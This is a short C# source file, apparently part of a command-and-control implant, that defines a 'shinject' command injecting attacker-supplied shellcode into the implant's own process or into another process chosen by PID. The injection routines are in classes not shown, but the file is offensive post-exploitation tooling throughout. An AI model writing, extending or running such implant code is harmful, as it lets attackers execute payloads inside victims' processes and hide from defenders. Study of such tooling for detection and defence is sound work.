using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Internal;
using Agent.Models;
namespace Agent.Commands
{
    class ShellcodeInject : AgentCommand
    {
        public override string Name => "shinject";

        public override string Execute(AgentTask task)
        {
            if (!int.TryParse(task.Args[0], out var pid))
                return "Failed to parse PID";
            if (pid == 0)
            {
                var localInjector = new SelfInjector();
                var result = localInjector.Inject(task.FileBytes);
                if (result) return "Shellcode Injected Into Self";
                return "Failed to self-inject shellcode";
            }
            var remoteInjector = new RemoteInjector();
            var success = remoteInjector.Inject(task.FileBytes, pid);
            if (success) return $"Shellcode Injected into pid {pid}";
            return $"Failed to remote-inject pid {pid}";
        }
    }
}
